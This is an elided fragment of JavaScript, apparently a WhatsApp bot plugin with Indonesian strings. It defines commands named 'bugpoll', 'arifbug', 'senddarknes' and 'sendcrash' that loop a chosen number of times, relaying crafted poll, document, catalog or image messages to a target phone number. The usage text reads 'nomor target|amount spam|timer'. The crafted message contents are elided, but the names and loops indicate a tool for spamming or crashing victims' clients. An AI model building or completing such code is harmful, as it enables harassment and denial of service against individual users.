...
let handler = async (m, { conn, args, usedPrefix, command, participants }) => {
  ...
  if (command == "bugpoll") {
    ...
    for (let i = 0; i < jumlah; i++) {
      ...
      conn.relayMessage(m.chat, pollCreation.message, {
 ...
 ➲ *Pesan : ${args[0] ? args[0] : "kosong"}*\n\n`;
  ...
  if (command == "arifbug") {
    ...
    let a = await conn.sendMessage(m.chat, {
      react: { key: { remoteJid: m.chat, fromMe: true, id: m.key.id } },
    });
    let dok = {
      key: { participant: "0@s.whatsapp.net" },
      message: { documentMessage: { title: `© 𝑨𝒓𝒊𝒇𝒛𝒚𝒏`, jpegThumbnail: miku } },
    };
    var messa = await prepareWAMessageMedia(
      { image: await (await fetch(nmiku)).buffer() },
    ...
    conn.relayMessage(args[0] + "@s.whatsapp.net", catalog.message, {
  ...
  if (command == "rifdarknes") {
    ...
    for (let i = 0; i < jumlah; i++) {
      ...
      conn.relayMessage(m.chat, document.message, {
  ...
  if (command == "senddarknes") {
    if (args.length == 0)
      return m.reply(
        `*Syntax Error!*\n\nUse : ${
          usedPrefix + command
        } nomor target|amount spam|timer\nExample : ${command} 62xxx|1|10s\n\n\ns = Second/Detik`
      );
    const num = args[0].split("|")[0];
    const jumlah = args[0].split("|")[1];
    for (let i = 0; i < jumlah; i++) {
      ...
      conn.relayMessage(num + "@s.whatsapp.net", document.message, {
        messageId: document.key.id,
      });
    }
  ...
  if (command == "sendcrash") {
    ...
    for (let i = 0; i < jumlah; i++) {
      ...
      conn.relayMessage(num + "@s.whatsapp.net", image.message, {
